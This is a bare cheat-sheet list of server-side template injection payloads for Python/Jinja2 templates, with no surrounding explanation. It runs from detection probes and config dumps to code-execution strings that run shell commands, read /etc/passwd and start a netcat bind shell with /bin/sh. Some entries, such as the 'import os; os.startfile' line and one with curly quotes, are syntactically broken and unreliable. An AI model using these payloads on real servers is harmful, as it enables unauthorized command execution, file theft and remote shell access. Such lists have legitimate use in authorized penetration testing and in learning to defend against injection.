# SSTI Payloads
```py
{{ '7'*7 }}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}} 
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{{ config.items() }}
{{ config.from_object('os') }}
{{''.__class__.mro()[1].__subclasses__()[46]('touch /tmp/rce',shell=True)}}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config['RUNCMD']('/usr/bin/id',shell=True) }}
{{ import os; os.startfile("nc -lnvp 4444 -e /bin/sh") }}
{{‘’.__class__.__mro__[2].__subclasses__()[258]}}
```
